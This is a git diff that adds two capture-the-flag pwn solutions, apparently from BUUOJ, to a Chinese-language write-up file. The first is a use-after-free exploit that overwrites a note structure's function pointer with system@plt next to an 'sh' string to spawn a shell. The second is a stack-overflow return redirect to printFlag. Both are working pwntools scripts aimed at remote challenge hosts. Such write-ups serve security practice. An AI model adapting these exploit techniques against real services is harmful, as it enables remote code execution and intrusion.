@@ -704,3 +704,64 @@ payload_exploit = b'\x11' * (0x6c + 4) + p32(system_addr) + p32(e.sym['main']) +
 p.sendline(payload_exploit)
 p.interactive()
 ```
+
+### ciscn_2019_n_3
+
+有UAF问题，free之后没有对指针变量置零；覆盖结构体的函数指针以及提供一个`"sh"`字符串就可以了。
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './ciscn_2019_n_3'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 25985)
+e = ELF(filename)
+# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+# libc = ELF('/home/ubuntu/glibc-lib/buuoj-ubuntu-16-glibc-2.23.so')
+
+def new_(index, content=None, length=None, type=None):
+    p.sendlineafter(b'CNote > ', b'1')
+    p.sendlineafter(b'Index > ', str(index).encode())
+
+    if isinstance(content, int):
+        p.sendlineafter(b'Type > ', b'1')
+        p.sendlineafter(b'Value > ', str(content).encode())
+    elif content is not None:
+        length = length or len(content)
+        p.sendlineafter(b'Type > ', b'2')
+        p.sendlineafter(b'Length > ', str(length).encode())
+        p.sendafter(b'Value > ', content)
+    else:
+        p.sendlineafter(b'Type > ', str(type).encode())
+
+def show(index):
+    p.sendlineafter(b'CNote > ', b'3')
+    p.sendlineafter(b'Index > ', str(index).encode())
+
+def del_(index):
+    p.sendlineafter(b'CNote > ', b'2')
+    p.sendlineafter(b'Index > ', str(index).encode())
+
+new_(0, content=0)
+new_(1, content=1)
+new_(2, content=2)
+del_(0)
+del_(1)
+new_(3, content=b'sh\x00\x00'+p32(e.plt['system'])+b'\n', length=0xc)
+del_(0)
+p.interactive()
+```
+### bbys_tu_2016
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './bbys_tu_2016'
+#p = process(filename)
+p = remote('node3.buuoj.cn', 26098)
+e = ELF(filename)
+
+p.sendline(b'b'*(0x14+4)+p32(e.sym['printFlag']))
+p.interactive()
+```
